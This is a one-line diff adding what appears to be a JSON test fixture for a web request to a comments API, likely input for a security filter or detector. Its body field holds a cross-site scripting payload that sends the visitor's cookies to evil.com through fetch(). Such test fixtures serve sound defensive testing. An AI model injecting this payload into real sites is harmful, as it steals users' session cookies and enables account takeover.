@@ -1,0 +1,1 @@
+{"context":{"requestId":"test-2","timestamp":"2026-04-26T21:00:00Z","method":"POST","path":"/api/comments","headers":{},"body":{"text":"<script>fetch('http://evil.com?c='+document.cookie)</script>"},"sourceIp":"203.0.113.1","userAgent":"Mozilla/5.0"}}
